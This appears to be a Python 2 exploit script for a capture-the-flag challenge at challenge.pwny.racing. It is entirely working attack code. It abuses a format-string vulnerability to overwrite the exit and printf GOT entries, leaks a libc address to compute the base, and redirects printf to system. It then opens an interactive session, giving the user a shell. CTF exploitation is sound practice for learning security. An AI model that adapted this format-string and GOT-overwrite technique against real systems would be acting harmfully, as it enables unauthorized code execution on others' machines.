#!/usr/bin/env python2
import socket
import struct
import telnetlib
import sys, time
import pwn

HOST, PORT = "challenge.pwny.racing", 11537
#HOST, PORT = "127.0.0.1", 1234

p32 = lambda v: struct.pack("<I", v)
p64 = lambda v: struct.pack("<Q", v)

s = socket.create_connection((HOST,PORT))
def ru(a,debug=False):
	d = ""
	while not d.endswith(a):
		c = s.recv(4096)
		d += c
                if debug: print `d`
		assert(c)
	return d
sn = lambda d: s.sendall(str(d) + "\n")


ru("\n\ninput: ")

#write 0x80485EB to exit got entry (0x804B020)
fmt = ""

wanted = 0x080485EB

wanted = 0xffffffff & ((wanted >> 16) | (wanted << 16))

first = wanted >> 16
second = wanted & 0xffff
second -= first
second = second & 0xffff

fmt += "%" + str(first-8) + "c"
fmt += "%" + str(6+1) + "$hn"

fmt += "%" + str(second) + "c"
fmt += "%" + str(7+1) + "$hn"

sn(p32(0x804B020) + p32(0x804B020+2) + fmt)
ru("\n\ninput: ")

#leak libc base
fmt = "%7$sAAAA"
sn(p32(0x804B014) + fmt)
d = struct.unpack("I", ru("\n\ninput: ")[4:].split("AAAA")[0][:4])[0]
libc = d - 0xbddd0


print hex(libc)

if 1:
    #write libc+system to printf got entry (0x804B00c)
    fmt = ""

    wanted = libc + 0x3cd10

    wanted = 0xffffffff & ((wanted >> 16) | (wanted << 16))

    first = wanted >> 16
    second = wanted & 0xffff
    second -= first
    second = second & 0xffff

    fmt += "%" + str(first-8) + "c"
    fmt += "%" + str(6+1) + "$hn"

    fmt += "%" + str(second) + "c"
    fmt += "%" + str(7+1) + "$hn"

    sn(p32(0x804B00c) + p32(0x804B00c+2) + fmt)

t = telnetlib.Telnet()
#t.set_debuglevel(99999)
t.sock = s
t.interact()
